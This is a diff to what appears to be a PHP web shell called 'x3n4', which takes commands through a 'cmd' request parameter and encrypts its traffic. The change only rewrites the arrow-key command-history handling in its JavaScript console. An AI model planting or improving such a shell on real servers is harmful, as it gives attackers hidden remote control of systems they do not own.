@@ -363,7 +363,7 @@ if (isset($_REQUEST['cmd'])) {
             this.algo = '<?php echo X3N4_ENCRYPTION_ALGORITHM; ?>';
 
             this.history = [];
-            this.key_count = -1;
+            this.history_cursor = null;
 
             this.encrypt = function(input) {
                 switch (this.algo) {
@@ -418,28 +418,38 @@ if (isset($_REQUEST['cmd'])) {
                     }
                 });
             }
-            this.bindKeyboardEvents = function() {
-                $('#stdin').on('keydown', { history : this.history, count : this.key_count }, function (ev) {
-                    var code = ev.keyCode ? ev.keyCode : ev.which;
-                    if (ev.data.history.length > 0) {
-                        switch (code){
-                            case 38:
-                                if (ev.data.count < (ev.data.history.length - 1)) {
-                                    ev.data.count++;
-                                    var command = ev.data.history[(ev.data.history.length - 1) - ev.data.count];
-                                    $('#stdin').val(command);
-                                }
-                                break;
-                            case 40:
-                                if (ev.data.count >= 0) {
-                                    ev.data.count--;
-                                    var command = ev.data.history[(ev.data.history.length - 1) - ev.data.count];
-                                    $('#stdin').val(command);
-                                }
-                                break;
-                        }}
+            this.bindKeyboardEvents = function () {
+                var $this = this;
+
+                $( '#stdin' ).on( 'keydown', function ( ev ) {
+                    var pressed_key = ( ev.keyCode ? ev.keyCode : ev.which );
+                    var history = $this.history;
+                    var history_length = history.length;
+
+                    var history_cursor = $this.history_cursor === null ? history_length : $this.history_cursor;
+
+                    var ARROW_KEY_UP = 38;
+                    var ARROW_KEY_DOWN = 40;
+                    var command;
+
+                    if ( history_length < 1 || (pressed_key != ARROW_KEY_UP && pressed_key != ARROW_KEY_DOWN)) {
+                        return;
                     }
-                );
+                    
+                    if ( pressed_key == ARROW_KEY_UP ) {
+                        history_cursor--;
+                        command = history[ history_cursor ] || history[ 0 ];
+                    } else if ( pressed_key == ARROW_KEY_DOWN ) {
+                        history_cursor++;
+                        command = history[ history_cursor ] || '';
+                    }
+
+                    if( history_cursor > -1 && history_cursor <= history_length ) {
+                        $this.history_cursor = history_cursor;
+                    }
+                                
+                    $( '#stdin' ).val( command );
+                });
             }
         }
         window.x3n4 = new x3n4();
